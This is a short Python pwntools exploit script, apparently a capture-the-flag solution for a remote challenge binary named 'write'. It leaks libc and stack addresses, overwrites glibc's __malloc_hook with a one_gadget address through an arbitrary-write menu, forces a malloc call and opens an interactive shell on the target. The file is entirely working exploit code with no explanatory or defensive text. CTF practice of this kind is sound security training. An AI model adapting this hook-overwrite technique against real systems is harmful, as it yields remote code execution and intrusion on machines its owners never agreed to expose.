#!/usr/bin/env python3
from pwn import *

def write(ptr, val):
    p.sendlineafter(b'(q)uit', 'w')
    p.sendlineafter(b'ptr: ', str(ptr))
    p.sendlineafter(b'val: ', val)

def quit():
    p.sendlineafter(b'(q)uit', 'q')

libc = ELF('./libc-2.27.so')
# p = process('./write')
p = remote('pwn.byteband.it', 9000)

p.recvuntil(b'puts: ')
libc.address = int(p.recvuntil(b'\n', drop=True), 16) - libc.symbols['puts']
log.info('libc.address: {:#x}'.format(libc.address))

p.recvuntil(b'stack: ')
stack = int(p.recvuntil(b'\n', drop=True), 16)
log.info('stack: {:#x}'.format(stack))

one_gadget = libc.address + 0x4f322
log.info('one_gadget: {:#x}'.format(one_gadget))
log.info('stack-0x7e0: {:#x}'.format(stack-0x7e0))

write(libc.symbols['__malloc_hook'], str(one_gadget))
write(stack-0x7e0, str(0))
write(stack+0x100, b'1'*0x400)

p.interactive()
